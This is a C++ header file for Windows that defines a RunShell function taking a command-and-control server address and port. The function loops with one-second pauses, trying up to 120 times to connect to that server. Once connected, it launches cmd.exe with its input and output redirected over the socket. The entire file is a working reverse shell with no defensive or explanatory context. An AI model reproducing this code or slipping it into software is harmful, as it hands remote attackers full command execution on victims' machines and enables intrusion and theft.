#pragma once
#include <winsock2.h>
#include <Windows.h>
#pragma comment(lib, "Ws2_32.lib")

//https://gist.github.com/mrexodia/ff921d366f62d162f4041f4b39146318
//chcp 65001
void RunShell(char* C2Server, int C2Port)
{
	constexpr auto tickTime = 1000;
	constexpr auto totalTicks = 120;

	for (int i = 0; i < totalTicks; i++)
	{
		Sleep(tickTime);

		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;

		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
		{
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else
		{
			char Process[] = "cmd.exe";
			STARTUPINFOA sinfo;
			PROCESS_INFORMATION pinfo;
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
			CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
			WaitForSingleObject(pinfo.hProcess, INFINITE);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			closesocket(mySocket);
			WSACleanup();
			break;
		}
	}
}